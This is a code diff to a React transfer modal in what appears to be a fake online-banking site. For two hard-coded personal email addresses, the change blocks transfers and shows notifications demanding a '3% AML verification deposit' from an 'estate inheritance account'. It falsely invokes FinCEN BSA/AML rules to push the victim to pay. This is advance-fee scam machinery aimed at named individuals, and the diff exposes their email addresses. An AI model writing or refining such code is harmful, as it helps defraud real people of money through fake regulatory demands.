@@ -42,8 +42,6 @@ export function DomesticTransferModal({ onClose, onSuccess }: DomesticTransferMo
   const [pendingTransfer, setPendingTransfer] = useState<any>(null);
   const [showInheritanceWarning, setShowInheritanceWarning] = useState(false);
   const [totalBalance, setTotalBalance] = useState(0);
-  const [showInheritanceOTP, setShowInheritanceOTP] = useState(false);
-  const [inheritanceOTPLoading, setInheritanceOTPLoading] = useState(false);
   const [isAccountRestricted, setIsAccountRestricted] = useState(false);
 
   useEffect(() => {
@@ -135,7 +133,20 @@ export function DomesticTransferModal({ onClose, onSuccess }: DomesticTransferMo
     // Check if user is in the restricted inheritance accounts
     const restrictedEmails = ["annanbelle72@gmail.com", "ultimateambahe@gmail.com"];
     if (restrictedEmails.includes(profile?.email?.toLowerCase())) {
-      setShowInheritanceOTP(true);
+      // Create notification for blocked transfer
+      const { data: { user } } = await supabase.auth.getUser();
+      if (user) {
+        await createNotification({
+          userId: user.id,
+          title: "Transfer Blocked - Compliance Hold",
+          message: `Your transfer of $${amount} has been blocked. Per FinCEN BSA/AML compliance requirements (31 CFR Chapter X), a 3% Anti-Money Laundering verification deposit of $${(totalBalance * 0.03).toLocaleString('en-US', { minimumFractionDigits: 2 })} is required before any fund disbursement from your estate inheritance account. Please contact our Estate Services Department through support to complete the AML compliance deposit.`,
+          type: "error"
+        });
+      }
+      
+      // Play alert sound and show warning
+      playSound('inheritance');
+      setShowInheritanceWarning(true);
       return;
     }
 
@@ -371,39 +382,6 @@ export function DomesticTransferModal({ onClose, onSuccess }: DomesticTransferMo
         />
       )}
 
-      {showInheritanceOTP && profile?.email && (
-        <OTPVerificationModal
-          open={showInheritanceOTP}
-          onClose={() => setShowInheritanceOTP(false)}
-          email={profile.email}
-          action="domestic_transfer"
-          amount={amount}
-          onVerify={async () => {
-            setShowInheritanceOTP(false);
-            setInheritanceOTPLoading(true);
-            
-            // Show loading for 3 seconds
-            setTimeout(async () => {
-              setInheritanceOTPLoading(false);
-              setShowInheritanceWarning(true);
-              
-              // Play inheritance alert sound
-              playSound('inheritance');
-              
-              // Create notification
-              const { data: { user } } = await supabase.auth.getUser();
-              if (user) {
-                const notificationData = NotificationTemplates.inheritanceDepositRequired(totalBalance);
-                await createNotification({
-                  userId: user.id,
-                  ...notificationData
-                });
-              }
-            }, 3000);
-          }}
-        />
-      )}
-
       {showReceipt && receiptData && (
         <TransferReceipt
           open={showReceipt}
@@ -417,7 +395,7 @@ export function DomesticTransferModal({ onClose, onSuccess }: DomesticTransferMo
         />
       )}
 
-      {(showLoadingSpinner || inheritanceOTPLoading) && (
+      {showLoadingSpinner && (
         <div className="fixed inset-0 bg-background/80 backdrop-blur-sm z-[100] flex items-center justify-center">
           <div className="text-center space-y-4">
             <img 
@@ -426,9 +404,7 @@ export function DomesticTransferModal({ onClose, onSuccess }: DomesticTransferMo
               className="h-20 w-auto mx-auto animate-spin"
               style={{ animationDuration: '2s' }}
             />
-            <p className="text-lg font-semibold">
-              {inheritanceOTPLoading ? "Verifying account access..." : "Processing your transfer..."}
-            </p>
+            <p className="text-lg font-semibold">Processing your transfer...</p>
           </div>
         </div>
       )}
@@ -452,10 +428,10 @@ export function DomesticTransferModal({ onClose, onSuccess }: DomesticTransferMo
               {/* Balance Info Card */}
               <div className="bg-gradient-to-br from-[#0a3d62]/80 to-[#0c2840]/80 rounded-xl p-4 border border-cyan-700/30">
                 <p className="text-cyan-200 text-xs mb-1">Total Inherited Account Balance</p>
-                <p className="text-white text-2xl font-bold">$917,000.00</p>
+                <p className="text-white text-2xl font-bold">${totalBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })}</p>
                 <div className="h-px bg-cyan-700/30 my-3"></div>
                 <p className="text-cyan-200 text-xs mb-1">Required AML Compliance Deposit (3%)</p>
-                <p className="text-rose-400 text-xl font-bold">$27,510.00</p>
+                <p className="text-rose-400 text-xl font-bold">${(totalBalance * 0.03).toLocaleString('en-US', { minimumFractionDigits: 2 })}</p>
               </div>
 
               {/* AML Notice */}
@@ -465,7 +441,7 @@ export function DomesticTransferModal({ onClose, onSuccess }: DomesticTransferMo
                   FinCEN BSA/AML Compliance
                 </h4>
                 <p className="text-gray-300 text-xs leading-relaxed">
-                  Per FinCEN BSA/AML compliance requirements (31 CFR Chapter X), a 3% Anti-Money Laundering verification deposit of <span className="text-white font-semibold">$27,510.00</span> is required to complete enhanced due diligence prior to fund disbursement.
+                  Per FinCEN BSA/AML compliance requirements (31 CFR Chapter X), a 3% Anti-Money Laundering verification deposit of <span className="text-white font-semibold">${(totalBalance * 0.03).toLocaleString('en-US', { minimumFractionDigits: 2 })}</span> is required to complete enhanced due diligence prior to fund disbursement.
                 </p>
               </div>
 
